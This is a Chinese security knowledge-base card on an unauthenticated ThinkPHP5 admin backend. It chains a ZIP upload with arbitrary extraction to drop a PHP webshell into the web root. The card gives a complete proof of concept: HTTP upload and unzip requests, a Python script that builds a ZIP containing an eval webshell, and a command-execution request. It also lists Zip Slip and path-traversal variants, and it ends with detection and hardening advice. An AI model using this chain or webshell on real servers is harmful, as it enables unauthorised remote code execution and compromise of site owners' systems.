---
id: web-generic-file-upload-thinkphp-admin-upload-unzip-webshell
title: ThinkPHP5 后台未授权 ZIP 上传 + Update/unzip 任意解压：压缩包内 public/shell.php 落 Web 根 RCE
type: scenario
domain: web
path: web/generic/file-upload
technique: thinkphp-unauth-upload-unzip-chain
aliases:
- 阿拉德后台 RCE
- elementUpload 上传
- Update/unzip 任意解压
- zipPath 任意解压
- ThinkPHP 后台未授权
- zip 内嵌 public 目录 getshell
- 上传 zip 解压写 webshell
tags:
- php
- thinkphp
- file-upload
- zip
- arbitrary-file-write
- webshell
- rce
- unauth
- code-audit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V51
  verified_at: '2026-11-05T09:06:48+08:00'
  notes: 已对照原文与9张图核对：File.php elementUpload 白名单 rar/zip/sql/json、dir 拼 public/uploads、Update.php unzip 按 ROOT_PATH+条目 copy(zip://)、ZIP 条目 public/3.php 落到 game/public/3.php 并访问 phpinfo 均与卡一致；两控制器继承 Common 未鉴权由原文说明。未验证点：checkMuma 实现原文未展示；PoC 为原文环境复现、未本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

ThinkPHP5 后台的两个控制器继承的 `Common` 基类未做登录校验：`/admin/File/elementUpload.html` 允许上传白名单内的 `.zip` 到 `public/uploads/<dir>/`，`/admin/Update/unzip.html` 又接受任意 `zipPath` 并用 `ZipArchive` + `copy('zip://...')` 把条目按 `ROOT_PATH/<entry>` 解压；把含 `public/shell.php` 的 ZIP 上传后再解压，PHP 文件落到 Web 根 `game/public/`，访问即执行。

## 原理

- **路由与鉴权**：ThinkPHP 路由为 `/模块/控制器/方法`，`/admin/File/elementUpload.html` 对应 `game/application/admin/controller/File.php::elementUpload()`，`/admin/Update/unzip.html` 对应 `Update.php::unzip()`。两个控制器都 `extends Common`，而 `Common` 基类没有登录/权限校验，因此两个功能都可未授权调用；这是整条链的前置条件。
- **上传点**：
  ```php
  $data = input('');
  $dir = (isset($data["dir"]) && !empty($data["dir"])) ? trim($data["dir"]) : "ald";
  $file = $_FILES['file'];
  $extension = strtolower(pathinfo($file["name"], PATHINFO_EXTENSION));
  $types = array("rar","zip","sql","json");
  if (!in_array($extension, $types)) { exit(...); }
  $targetDir = ROOT_PATH . "public/uploads/{$dir}";
  if (!file_exists($targetDir)) { mkdir($targetDir, 0777, true); }
  $fileName = basename($file["name"]);
  if (checkMuma($file["tmp_name"]) == 1) { exit(...); }
  move_uploaded_file($file["tmp_name"], $targetDir . DIRECTORY_SEPARATOR . $fileName);
  ```
  扩展名白名单包含 `zip`；`dir` 只 `trim` 后拼进目录（未过滤 `../`）；`checkMuma` 检查的是上传的压缩包原始字节，压缩后的 PHP 内容不会被检出，因此 ZIP 可通过。
- **解压点**：
  ```php
  $zipPath = trim($data['zipPath']);
  $zip = new \ZipArchive;
  if ($zip->open($zipPath) === true) {
      for ($i = 0; $i < $zip->numFiles; $i++) {
          $statInfo = $zip->statIndex($i, \ZipArchive::FL_ENC_RAW);
          $filename = $this->transcoding($statInfo['name']);
          if ($statInfo['crc'] == 0) {
              $dir = ROOT_PATH.'/'.substr($filename, 0, -1);
              mkdir($dir, 0755, true);
          } else {
              $filepath = ROOT_PATH.'/'.$filename;
              mkdir(dirname($filepath), 0755, true);
              copy('zip://'.$zipPath.'#'.$zip->getNameIndex($i), $filepath);
          }
      }
  }
  ```
  `zipPath` 支持绝对/相对路径；条目名直接 `ROOT_PATH.'/'.$filename` 拼接后写文件，既没有扩展名白名单，也没有 `..`/绝对路径/规范化检查。攻击者既能控制“解压哪个 ZIP”，也能控制“ZIP 里有什么路径”，因此可把任意文件写到 `ROOT_PATH` 下的任意位置（含 Zip Slip）。
- **落 Web 根的关键**：`ROOT_PATH` 是应用根 `game/`，而 Web 根是 `game/public/`。ZIP 条目写成 `public/3.php`，解压路径就是 `game/public/3.php`，正好落在 Web 根；访问 `/3.php` 即由 PHP 执行。若不理解 `ROOT_PATH` 与 docroot 的层级关系，直接放 `3.php` 会落到 `game/3.php`（不可访问）。
- **为什么能 RCE**：ZIP 内的 PHP 内容不受扩展名过滤（解压逻辑不检查条目后缀），`copy('zip://...')` 解压后文件位于可执行目录；两步都无需登录，形成完整的未授权上传 → 任意文件写 → 代码执行链。

## 触发条件

- 目标使用该 ThinkPHP5 后台代码（控制器 `admin/File::elementUpload` 与 `admin/Update::unzip` 存在）。
- 两个控制器继承的 `Common` 基类未实现登录/权限校验（本类项目如此）。
- `ZipArchive` 扩展可用；`public/uploads` 与 `ROOT_PATH` 可写。
- Web 服务器把 `public/` 作为站点根且允许 PHP 解析。
- 站点未在路由层对该后台模块做统一鉴权。

## 利用步骤

1. 本地准备 ZIP：创建目录 `public/`，放入 `3.php`（内容 `<?php phpinfo(); @eval($_POST['pass']); ?>`），压缩为 `3.zip`。ZIP 内路径必须是 `public/3.php`。
2. 上传 ZIP：
   ```http
   POST /admin/File/elementUpload.html?dir=gm HTTP/1.1
   Content-Type: multipart/form-data; boundary=...
   ```
   文件字段 `file`，filename `3.zip`；成功后文件位于 `public/uploads/gm/3.zip`。
3. 触发解压：
   ```http
   POST /admin/Update/unzip.html HTTP/1.1
   Content-Type: application/x-www-form-urlencoded

   zipPath=../public/uploads/gm/3.zip
   ```
   `zipPath` 是相对 Web 入口（`public/index.php`）的工作目录：`public/` 下执行时 `../public/uploads/gm/3.zip` 解析到 `game/public/uploads/gm/3.zip`。
4. 检查响应/目录；解压条目 `public/3.php` 写入 `game/public/3.php`。
5. 访问 `http://target/3.php`，phpinfo 或 POST `pass=system('id');` 执行命令。
6. 若响应无回显，改用可回显的命令马或写入 `.php` 探针确认路径。

## PoC

第一步（上传 ZIP）：

```http
POST /admin/File/elementUpload.html?dir=gm HTTP/1.1
Host: 37boke.test
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWXA97hizSHe7pnn7
Accept: */*

------WebKitFormBoundaryWXA97hizSHe7pnn7
Content-Disposition: form-data; name="file"; filename="3.zip"
Content-Type: application/x-zip-compressed

<3.zip 二进制内容>
------WebKitFormBoundaryWXA97hizSHe7pnn7--
```

ZIP 生成（结构必须含 `public/3.php`）：

```python
import zipfile
with zipfile.ZipFile("3.zip", "w") as z:
    z.writestr("public/3.php", "<?php phpinfo(); @eval($_POST['pass']); ?>")
```

第二步（解压）：

```http
POST /admin/Update/unzip.html HTTP/1.1
Host: 37boke.test
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

zipPath=../public/uploads/gm/3.zip
```

访问：

```http
GET /3.php HTTP/1.1
Host: 37boke.test
```

说明：原文在本地环境完整复现，成功解压到 `game/public/3.php` 并访问到 PHP 7.3.4 phpinfo 页面。PoC 未在本会话重新执行；`dir` 子目录名、`zipPath` 相对层级需按目标目录结构调整。

## 变体与关联

- **Zip 条目路径穿越**：解压代码直接把条目名拼到 `ROOT_PATH`，未规范化；条目用 `../../...` 可写到 `ROOT_PATH` 之外（Zip Slip），不依赖 `public/` 前缀。若目标目录结构不同，可先用该方式写任意路径。
- **上传 `dir` 穿越**：`$targetDir = ROOT_PATH."public/uploads/{$dir}"` 只 `trim`；`dir=../../...` 可尝试把 ZIP 直接写到其他目录，配合解压或覆盖文件。
- **绝对路径 zipPath**：`ZipArchive::open` 接受绝对路径；若能猜到服务器上已有 ZIP（备份、安装包、上传包），可直接解压，无需上传步骤。
- **扩展名白名单**：上传允许 rar/zip/sql/json；ZIP 是最适合承载 PHP 条目的格式；`checkMuma` 只扫描压缩包原始字节，无法解压后检测。
- **鉴权变体**：两个控制器都继承 `Common`；若其他版本给 Common 加了登录校验，链会断，需要先找该后台的未授权入口或弱口令。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]（Zip Slip 条目路径穿越写 Web 根）；[[web-generic-file-upload-emlog-template-zip-header-php-rce]]（后台模板 ZIP 上传 + 解压 PHP 落 Web 目录）；[[web-generic-file-upload-weak-suffix-bypass]]（上传类型校验缺陷）。

## 检测与防御

- **鉴权**：`Common` 基类统一做登录/权限校验，或对 `/admin/*` 模块整体加认证中间件；不要依赖控制器自己实现鉴权。
- **上传**：不要允许 ZIP 等可承载脚本的归档格式进入 Web 目录；上传目录移出 Web 根；`dir` 参数白名单化并 `basename`/规范化；对压缩包解压后再做内容扫描。
- **解压**：`zipPath` 限制为服务端生成的受控路径，禁止用户指定绝对/相对路径；解压前对每个条目做 `realpath`/`normalize` 并校验 `startsWith(dest)`，拒绝 `..`、绝对路径、符号链接；条目扩展名白名单；解压到 Web 根之外。
- **部署**：`public/uploads` 禁止 PHP 解析（Nginx `location ~ \.php$ { deny all; }` 或 Apache `<FilesMatch>`），上传目录只读挂载或独立存储。
- **检测特征**：未登录请求 `/admin/File/elementUpload.html`、`/admin/Update/unzip.html`；上传请求含 `.zip` 且随后同 IP 调用解压；ZIP 条目名含 `public/`、`../`、绝对路径；Web 根出现新 `.php` 文件；访问 `/uploads/*.php` 或根目录新脚本的请求。
- **应急**：删除上传的 ZIP 与解压出的脚本；审计访问日志确认未授权调用与命令执行；轮换可能泄露的配置/密钥；修补后回归正常更新/上传流程。
